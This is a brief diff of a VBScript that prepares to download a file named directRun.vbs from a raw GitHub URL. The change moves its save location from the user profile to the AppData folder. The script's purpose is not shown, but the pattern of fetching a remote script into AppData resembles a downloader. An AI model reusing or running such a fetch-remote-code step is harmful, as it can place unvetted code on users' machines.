@@ -5,7 +5,7 @@ If WScript.Arguments.length = 0 Then
 Else
    Dim i, objFile, objFSO, objHTTP, strFile
    Set WshShell = CreateObject("WScript.Shell")
-   Home = WshShell.ExpandEnvironmentStrings("%userprofile%")
+   Home = WshShell.ExpandEnvironmentStrings("%appdata%")
    file = Home & "\directRun.vbs"
    myURL = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/directRun.vbs"
    myPath = file
